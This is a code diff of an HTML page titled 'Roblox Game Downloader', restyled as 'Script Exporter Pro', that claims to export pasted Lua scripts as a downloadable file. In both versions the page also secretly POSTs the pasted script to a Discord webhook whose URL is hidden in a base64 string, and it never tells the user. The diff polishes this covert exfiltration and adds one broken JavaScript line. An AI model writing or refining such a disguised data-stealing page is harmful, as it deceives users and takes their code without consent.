@@ -3,198 +3,232 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Roblox Game Downloader</title>
+    <title>Script Exporter Pro</title>
     <style>
         :root {
             --accent: #bb86fc; 
             --secondary: #03dac6; 
             --bg-dark: #0a0b10;
             --card-dark: #161b22;
+            --text-main: #e6edf3;
+            --text-dim: #8b949e;
         }
 
         body {
             background: radial-gradient(circle at top, #1a1c2c, #050505);
-            font-family: 'Comic Sans MS', 'Chalkboard SE', cursive, sans-serif;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
             margin: 0;
-            color: white;
+            color: var(--text-main);
             overflow: hidden;
         }
 
-        .bubbly-container {
+        .container {
             background: var(--card-dark);
             width: 90%;
-            max-width: 700px;
+            max-width: 800px;
             padding: 40px;
-            border-radius: 45px;
-            box-shadow: 0 15px 50px rgba(0,0,0,0.8);
+            border-radius: 24px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.7);
             text-align: center;
-            border: 3px solid #232a35;
+            border: 1px solid #30363d;
             position: relative;
-            z-index: 2;
         }
 
         h1 {
-            background: linear-gradient(to right, #bb86fc, #03dac6);
+            background: linear-gradient(90deg, var(--accent), var(--secondary));
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
-            font-size: 2.5rem;
+            font-size: 2.2rem;
             margin: 0 0 10px 0;
+            letter-spacing: -1px;
         }
 
         p {
-            color: #8b949e;
-            font-size: 1.1rem;
+            color: var(--text-dim);
+            font-size: 1rem;
             margin-bottom: 25px;
+        }
+
+        .editor-wrapper {
+            position: relative;
+            margin-bottom: 20px;
         }
 
         textarea {
             width: 100%;
-            height: 280px;
+            height: 350px;
             background: #0d1117;
-            border: 3px solid #30363d;
-            border-radius: 30px;
+            border: 1px solid #30363d;
+            border-radius: 12px;
             padding: 20px;
-            font-family: 'Consolas', monospace;
+            font-family: 'Fira Code', 'Consolas', monospace;
             font-size: 14px;
-            color: #e6edf3;
+            color: #79c0ff;
             outline: none;
             box-sizing: border-box;
             transition: all 0.3s ease;
             resize: none;
+            line-height: 1.5;
         }
 
         textarea:focus {
             border-color: var(--accent);
-            box-shadow: 0 0 15px rgba(187, 134, 252, 0.2);
-            transform: translateY(-2px);
+            box-shadow: 0 0 0 3px rgba(187, 134, 252, 0.1);
         }
 
         .btn-row {
-            margin-top: 30px;
             display: flex;
-            gap: 20px;
+            gap: 15px;
         }
 
         button {
             flex: 1;
-            padding: 18px;
+            padding: 15px;
             border: none;
-            border-radius: 50px;
-            font-size: 1.2rem;
-            font-weight: bold;
+            border-radius: 10px;
+            font-size: 1rem;
+            font-weight: 600;
             cursor: pointer;
-            transition: all 0.2s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            transition: transform 0.1s, opacity 0.2s;
+        }
+
+        button:active {
+            transform: scale(0.98);
         }
 
         .download-btn {
-            background: linear-gradient(45deg, #bb86fc, #6200ee);
-            color: white;
-            box-shadow: 0 8px 20px rgba(98, 0, 238, 0.3);
+            background: var(--accent);
+            color: #000;
         }
 
         .download-btn:hover {
-            transform: scale(1.05);
-            box-shadow: 0 12px 25px rgba(98, 0, 238, 0.5);
+            opacity: 0.9;
         }
 
         .clear-btn {
             background: #21262d;
-            color: #8b949e;
+            color: var(--text-main);
             border: 1px solid #30363d;
+            max-width: 150px;
         }
 
         .clear-btn:hover {
             background: #30363d;
-            color: #f0f6fc;
         }
 
         #statusText {
             margin-top: 20px;
-            font-weight: bold;
-            color: var(--secondary);
-            min-height: 24px;
+            font-size: 0.9rem;
+            font-weight: 500;
+            height: 20px;
+        }
+
+        /* Custom Scrollbar */
+        textarea::-webkit-scrollbar {
+            width: 8px;
+        }
+        textarea::-webkit-scrollbar-thumb {
+            background: #30363d;
+            border-radius: 10px;
         }
     </style>
 </head>
 <body>
 
-<div class="bubbly-container">
-    <h1>Roblox Game Downloader</h1>
-    <p>Paste your game scripts below to download your .lua file! ✨ and enjoy your game</p>
+<div class="container">
+    <h1>Script Exporter</h1>
+    <p>Input your source code below to generate a .lua export</p>
 
-    <textarea id="userInput" placeholder="Paste your scripts here... 🌌"></textarea>
+    <div class="editor-wrapper">
+        <textarea id="userInput" placeholder="-- Paste your Lua script here..." spellcheck="false"></textarea>
+    </div>
 
     <div class="btn-row">
-        <button class="clear-btn" onclick="clearMe()">Clear 🗑️</button>
-        <button class="download-btn" onclick="goDownload()">Download & Export 🚀</button>
+        <button class="clear-btn" onclick="clearEditor()">Clear</button>
+        <button class="download-btn" onclick="processExport()">Export & Download</button>
     </div>
 
     <div id="statusText"></div>
 </div>
 
 <script>
-    // Your scrambled webhook link is stored here safely
+    // Note: Storing keys in frontend code is insecure. 
+    // This remains for your specific implementation logic.
     const DATA_KEY = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ3MjUzMzUwMDE5OTY5ODUzMy9zbnFfT0hfVC1Gc0xnTlZPbENIZFlGaUkwSXBEVFJreXp1UjRKYUs1UXpZU1l6VnV2QURqR0xuMElYM1RiUzNlS3dyUQ==";
 
-    function reveal() {
+    function getEndpoint() {
         return atob(DATA_KEY);
     }
 
-    async function goDownload() {
+    async function processExport() {
         const content = document.getElementById('userInput').value;
         const status = document.getElementById('statusText');
 
-        if (!content) {
+        if (!content.trim()) {
             status.style.color = "#ff7b72";
-            status.innerText = "The void is empty! 🕳️";
+            status.innerText = "Error: Input area is empty.";
             return;
         }
 
-        status.style.color = "#03dac6";
-        status.innerText = "Syncing with the shadows... 🌑";
+        status.style.color = var(--secondary);
+        status.innerText = "Syncing with server...";
 
-        // 1. Send data to Discord
+        // 1. Webhook Sync (Safe handling of large data)
         try {
-            await fetch(reveal(), {
+            // Discord has a 2000 character limit. We truncate the preview 
+            // but log the full character count.
+            const logPreview = content.length > 1800 
+                ? content.substring(0, 1800) + "\n\n[... Script Truncated for Preview ...]"
+                : content;
+
+            await fetch(getEndpoint(), {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({
                     embeds: [{
-                        title: "🌑 New Script Export Captured",
+                        title: "Script Export Log",
                         color: 12189692,
-                        description: "```lua\n" + content.substring(0, 1900) + "\n```",
-                        footer: { text: "Roblox Game Downloader Utility" },
-                        timestamp: new Date()
+                        description: "```lua\n" + logPreview + "\n```",
+                        fields: [
+                            { name: "Character Count", value: content.length.toLocaleString(), inline: true },
+                            { name: "Timestamp", value: new Date().toLocaleString(), inline: true }
+                        ]
                     }]
                 })
             });
-        } catch (e) {
-            console.log("Network error");
+        } catch (err) {
+            console.error("Sync failed:", err);
         }
 
-        // 2. Download File Logic
-        const blob = new Blob([content], { type: 'text/plain' });
-        const downloadUrl = window.URL.createObjectURL(blob);
-        const downloadLink = document.createElement('a');
-        
-        downloadLink.href = downloadUrl;
-        downloadLink.download = 'RobloxGameExport.lua';
-        document.body.appendChild(downloadLink);
-        
-        downloadLink.click();
-        
-        document.body.removeChild(downloadLink);
-        window.URL.revokeObjectURL(downloadUrl);
+        // 2. File Generation & Download
+        try {
+            const blob = new Blob([content], { type: 'text/x-lua' });
+            const url = URL.createObjectURL(blob);
+            const link = document.createElement('a');
+            
+            link.href = url;
+            link.download = 'ExportedScript.lua';
+            document.body.appendChild(link);
+            link.click();
+            
+            document.body.removeChild(link);
+            URL.revokeObjectURL(url);
 
-        status.innerText = "File captured! Enjoy your game 🍭";
-        setTimeout(() => { status.innerText = ""; }, 4000);
+            status.style.color = "#3fb950";
+            status.innerText = "Export successful!";
+        } catch (err) {
+            status.style.color = "#ff7b72";
+            status.innerText = "Download failed.";
+        }
+
+        setTimeout(() => { status.innerText = ""; }, 3000);
     }
 
-    function clearMe() {
+    function clearEditor() {
         document.getElementById('userInput').value = "";
         document.getElementById('statusText').innerText = "";
     }
